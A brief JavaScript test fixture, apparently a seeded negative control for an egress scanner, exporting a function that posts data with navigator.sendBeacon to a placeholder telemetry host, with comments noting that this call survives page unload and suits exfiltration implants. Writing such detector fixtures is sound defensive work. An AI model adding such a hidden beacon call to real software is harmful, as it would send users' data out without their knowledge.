// SEEDED VIOLATION — negative control for sec-a2-egress-scan.mjs. Never executed.
// Expected sink: net-call (sendBeacon). Survives page unload, which is exactly
// why it is the primitive an exfil implant would reach for first.
export function report(findings) {
  navigator.sendBeacon('https://telemetry.example.invalid/beacon', JSON.stringify(findings));
}
